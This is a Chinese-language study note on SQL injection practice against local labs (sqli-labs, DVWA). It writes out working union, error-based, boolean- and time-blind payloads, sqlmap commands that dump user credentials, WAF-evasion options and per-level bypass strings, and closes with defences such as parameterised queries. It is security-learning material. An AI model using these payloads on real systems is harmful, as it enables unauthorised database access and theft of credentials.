# 第五周：SQL 注入核心复盘笔记（实战避坑版）

> 实验环境：Kali Linux + Apache + PHP 8.4 + MariaDB 11.8 + sqli-labs-php7
> 核心目标：掌握联合查询、报错注入、布尔盲注、时间盲注四大流派，熟练使用 sqlmap 并配合 Burp 绕过 WAF。

## 一、手工注入四大流派总结

### 1. 联合查询注入（UNION-Based，Less-1）

适用：页面有明确回显位。原理：用 `UNION SELECT` 把伪造的查询结果拼接到原查询之后直接显示。

标准流程：

```bash
?id=1'                                   # 判断闭合：报错说明单引号闭合
?id=1' --+                               # 注释多余代码（或 %23）
?id=1' ORDER BY 3 --+                    # 猜列数：3 正常、4 报错 → 3 列
?id=-1' UNION SELECT 1,2,3 --+           # 找显位：-1 使原查询为空
?id=-1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='security' --+
```

> 实战避坑：浏览器地址栏的 `#` 会被当页面锚点不发给服务器，必须用 `--+` 或 `%23`。

### 2. 报错注入（Error-Based，Less-5）

适用：无回显位但暴露 SQL 报错。原理：故意构造语法错误，让报错信息携带查询结果。

```bash
?id=1' and extractvalue(1,concat(0x7e,(select database()))) --+
# 回显：XPATH syntax error: '~security'（~ 对应 0x7e）
```

> 实战避坑：新版 MariaDB 移除了 `updatexml`，认准 `extractvalue`；PHP 8 遇 SQL 报错会抛 Fatal Error 中断页面，需改源码开启 `error_reporting(E_ALL)` 并加 `mysqli_report(MYSQLI_REPORT_OFF);`。

### 3. 布尔盲注（Boolean-Based，Less-8）

适用：无回显、无报错，只有「正常/不正常」两种状态。

```bash
?id=1' and length(database())=8 --+
?id=1' and ascii(substr(database(),1,1))=115 --+   # 115 = 's'
```

> 实战避坑：Python 脚本必须加 `found = False` 标志位，猜解到空字符时自动 `break`，否则死循环。

### 4. 时间盲注（Time-Based，Less-9）

适用：条件真假页面返回完全一样。

```bash
?id=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 0) --+
?id=1' and if(ascii(substr(database(),1,1))=115, benchmark(10000000, md5('a')), 0) --+
```

## 二、sqlmap 自动化工具实战总结

```bash
# 列出所有数据库
sqlmap -u "http://127.0.0.1/sqli-labs-php7/Less-1/?id=1" --dbs --batch
# 指定列名导出（防卡在枚举列名）
sqlmap -u "..." -D security -T users -C "id,username,password" --dump --batch --threads=10
# POST 注入
sqlmap -u "http://127.0.0.1/sqli-labs-php7/Less-11/" --data="uname=test&passwd=x" -p "uname" --batch
# 配合 Burp 抓包
sqlmap -u "..." --proxy="http://127.0.0.1:8080"
# 伪装 UA 绕过 WAF
sqlmap -u "..." --random-agent
```

### sqlmap 底层 Payload 剖析

```sql
uname=test' UNION ALL SELECT NULL,CONCAT(0x71716b7671,IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20),0x716a766271) FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

`0x71716b7671` / `0x716a766271` 是随机十六进制特征码，包裹真实数据便于正则提取。字符集冲突（`Illegal mix of collations`）是 CAST 出 utf8mb4 与原表 gbk 不一致，手工加 `COLLATE gbk_chinese_ci`，或用 `--no-cast` / `--hex`。

## 三、DVWA 靶场 SQL 注入难度进阶

| 难度 | 绕过 |
|------|------|
| Low（无过滤） | `union select user,password from users` |
| Medium（过滤单引号） | 数字型注入（原 SQL 无引号）：`1 union select user,password from users` |
| High（只返回一条） | `union select user,password from users LIMIT 1` |

## 四、渗透测试防翻车 Checklist

1. `#` 失效立刻换 `--+` 或 `%23`；
2. PHP 8 下空白或 Fatal Error，改源码关闭 mysqli 异常抛出；
3. 跑 sqlmap 一定加 `--batch`；
4. sqlmap 提示 unable to retrieve column names，直接上 `-C` 指定列名；
5. 抓包看 Payload 时养成在 Burp 解码（Ctrl+U）的习惯。

## 五、防御与修复方案

1. **参数化查询（根本）**：用预处理语句把 SQL 结构与数据分离，不让用户输入参与拼接。

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

2. **数据库账号最小权限**：不给 root，限制可访问的库表；
3. **生产环境关闭详细报错**：不让报错注入有机可乘；
4. **WAF 作为补充**：可被绕过，不能作为唯一防线。

> 依据 OWASP SQL Injection Prevention Cheat Sheet：不要用手动转义替代参数绑定，也不要误以为 ORM 能自动免疫注入。
